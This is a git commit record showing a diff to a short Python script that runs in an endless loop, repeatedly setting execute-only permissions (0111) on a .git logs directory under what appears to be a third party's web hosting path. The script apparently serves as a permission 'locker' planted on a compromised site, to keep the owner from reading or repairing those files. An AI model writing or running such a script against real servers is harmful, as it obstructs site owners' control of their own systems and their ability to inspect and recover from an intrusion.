f39318e46d059994444d7c6362ff5fe233ba4838
BrebesJoker768 <140909242+BrebesJoker768@users.noreply.github.com>
2023-08-02 23:32:15 +0700

    Add files via upload

--- kontol.py
+++ kontol.py
@@ -1,5 +1,5 @@
 import os, time
 while True:
-    os.chmod("/home/dpmptspproboling/public_html/Project_Mahesa/.git/logs/refs/remotes/",0111)
+    os.chmod("/home/dpmptspproboling/public_html/Project_Mahesa/.git/logs/refs/remotes/origin/",0111)
     print("done")
     time.sleep(1)
